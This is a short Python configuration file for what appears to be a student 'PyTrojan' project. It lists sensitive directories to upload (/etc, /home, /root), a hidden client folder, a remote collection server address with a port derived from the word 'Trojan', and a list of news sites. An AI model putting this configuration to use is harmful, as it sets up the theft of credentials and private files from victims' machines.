#! python
# -*- coding: utf-8 -*-
"""
Created on Wed Jun 17 20:16:47 2020

@author: 劉又聖
"""


upload_dirs = {
                'Linux': ['/etc', '/home', '/root'],
                'Windows': ['C:\\Users\\劉又聖\\Desktop\\大學課程\\大二(下) 課程\\PyTrojan', 
                            'D:\\Tmp\\SaveFiles\\Local'],
                'Darwin': ['/etc', '/home', '/root'],
              }
server_save_dir  = {
                'Linux': '/tmp',
                'Windows': 'D:\\Tmp\\SaveFiles',
                'Darwin': '/tmp',
              }
client_save_dirs = {
                'Linux': '/tmp/.normal',
                'Windows': 'D:\\Tmp\\SaveFiles\\Local',
                'Darwin': '/tmp/.normal',
              }
server_sock_addr = ['10.21.23.10:{}'.format( ord('T')*sum(map(ord, 'rojan')) )]
news_website = [
    'https://www.bbc.com/news/technology',
    'https://techcrunch.com/',
    'https://www.wired.com/',
    'https://technews.acm.org/',
    'https://www.sciencealert.com/',
    'https://www.eff.org/',
    'https://www.nytimes.com/section/technology',
    'https://xrds.acm.org/news.cfm',
    ]